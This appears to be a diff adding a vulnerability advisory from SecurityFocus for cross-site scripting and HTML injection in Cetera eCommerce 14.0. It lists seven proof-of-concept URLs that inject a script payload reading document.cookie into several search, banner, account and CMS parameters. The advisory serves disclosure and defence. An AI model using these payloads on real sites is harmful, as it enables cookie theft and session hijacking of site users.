@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/42059/info
+
+Cetera eCommerce is prone to multiple cross-site-scripting and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+Cetera eCommerce version 14.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/cms/templates/search.php?q=111&sobject=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+http://www.example.com/cms/templates/bannerlist.php?deleted=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+http://www.example.com/cms/templates/bannerlist.php?errorMessage=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+http://www.example.com/cms/templates/banner.php?errorMessage=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+http://www.example.com/account/?messageES=s9&messageParam[0]=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+http://www.example.com/cms/index.php?messageES=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
+http://www.example.com/cms/index.php?messageES=s9&messageParam[0]=%3Cscript%3Ealert(document.cookie)%3C/script%3E 
